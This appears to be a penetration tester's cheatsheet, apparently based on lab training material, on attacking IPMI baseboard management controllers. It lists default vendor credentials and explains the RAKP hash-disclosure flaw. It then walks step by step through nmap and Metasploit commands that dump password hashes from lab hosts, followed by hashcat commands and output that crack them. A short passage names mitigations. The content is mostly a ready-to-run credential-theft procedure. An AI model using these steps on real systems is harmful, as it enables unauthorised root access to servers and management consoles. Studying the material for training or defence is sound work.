# 🔥 IPMI

Tags: #🔥
Related to: [[nmap]], [[metasploit framework]], [[hashcat]]
See also:
Previous: [[TACTICS]], [[Footprinting]]

## Description

## Cheatsheet

| **Command** | **Description** |
| --- | --- |
| `msf6 auxiliary(scanner/ipmi/ipmi_version)` | IPMI version detection. |
| `msf6 auxiliary(scanner/ipmi/ipmi_dumphashes)` | Dump IPMI hashes. |

#### Default Passwords

| Product | Username | Password |
| --- | --- | --- |
| Dell iDRAC | root | calvin |
| HP iLO | Administrator | randomized 8-character string consisting of numbers and uppercase letters |
| Supermicro IPMI | ADMIN | ADMIN |

#### Dangerous Settings

If default credentials do not work to access a BMC, we can turn to a [flaw](http://fish2.com/ipmi/remote-pw-cracking.html) in the RAKP protocol in IPMI 2.0. During the authentication process, the server sends a salted SHA1 or MD5 hash of the user's password to the client before authentication takes place. This can be leveraged to obtain the password hash for ANY valid user account on the BMC. These password hashes can then be cracked offline using a dictionary attack using `Hashcat` mode `7300`. In the event of an HP iLO using a factory default password, we can use this Hashcat mask attack command `hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u` which tries all combinations of upper case letters and numbers for an eight-character password.

There is no direct "fix" to this issue because the flaw is a critical component of the IPMI specification. Clients can opt for very long, difficult to crack passwords or implement network segmentation rules to restrict the direct access to the BMCs. It is important to not overlook IPMI during internal penetration tests (we see it during most assessments) because not only can we often gain access to the BMC web console, which is a high-risk finding, but we have seen environments where a unique (but crackable) password is set that is later re-used across other systems. On one such penetration test, we obtained an IPMI hash, cracked it offline using Hashcat, and were able to SSH into many critical servers in the environment as the root user and gain access to web management consoles for various network monitoring tools.

## Usage Examples

### nmap

	sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local

```text
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-04 21:48 GMT
Nmap scan report for ilo.inlanfreight.local (172.16.2.2)
Host is up (0.00064s latency).

PORT    STATE SERVICE
623/udp open  asf-rmcp
| ipmi-version:
|   Version:
|     IPMI-2.0
|   UserAuth:
|   PassAuth: auth_user, non_null_user
|_  Level: 2.0
MAC Address: 14:03:DC:674:18:6A (Hewlett Packard Enterprise)

Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds
```

### Metasploit Version Scan

	msf6 > use auxiliary/scanner/ipmi/ipmi_version
	msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195
	msf6 auxiliary(scanner/ipmi/ipmi_version) > show options
```text
Module options (auxiliary/scanner/ipmi/ipmi_version):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   BATCHSIZE  256              yes       The number of hosts to probe in each set
   RHOSTS     10.129.42.195    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      623              yes       The target port (UDP)
   THREADS    10               yes       The number of concurrent threads
```

	msf6 auxiliary(scanner/ipmi/ipmi_version) > run

```text
[*] Sending IPMI requests to 10.129.42.195->10.129.42.195 (1 hosts)
[+] 10.129.42.195:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) 
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### Metasploit Dumping Hashes

	msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
	msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
	msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options

```text
Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):

   Name                 Current Setting                                                    Required  Description
   ----                 ---------------                                                    --------  -----------
   CRACK_COMMON         true                                                               yes       Automatically crack common passwords as they are obtained
   OUTPUT_HASHCAT_FILE                                                                     no        Save captured password hashes in hashcat format
   OUTPUT_JOHN_FILE                                                                        no        Save captured password hashes in john the ripper format
   PASS_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt  yes       File containing common passwords for offline cracking, one per line
   RHOSTS               10.129.42.195                                                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                623                                                                yes       The target port
   THREADS              1                                                                  yes       The number of concurrent threads (max one per host)
   USER_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line
```

	msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run

```text
[+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:8e160d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e
[+] 10.129.42.195:623 - IPMI - Hash for user 'ADMIN' matches password 'ADMIN'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### Crack Hash

```text
[+] 10.129.202.5:623 - IPMI - Hash found: admin:fe2089a6821400004081f90a292a15b0353fac06232249bcf09793153a43fb084f53edb4729e76fba123456789abcdefa123456789abcdef140561646d696e:1b8f35eff6b1c7fd679dd46bff6a26337fcf1c88
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

	echo fe2089a6821400004081f90a292a15b0353fac06232249bcf09793153a43fb084f53edb4729e76fba123456789abcdefa123456789abcdef140561646d696e:1b8f35eff6b1c7fd679dd46bff6a26337fcf1c88 > ipmi.txt
	hashcat -m 7300 ipmi.txt rockyou.txt

```text
Dictionary cache built:
* Filename..: rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

fe2089a6821400004081f90a292a15b0353fac06232249bcf09793153a43fb084f53edb4729e76fba123456789abcdefa123456789abcdef140561646d696e:1b8f35eff6b1c7fd679dd46bff6a26337fcf1c88:trinity
```



# Resources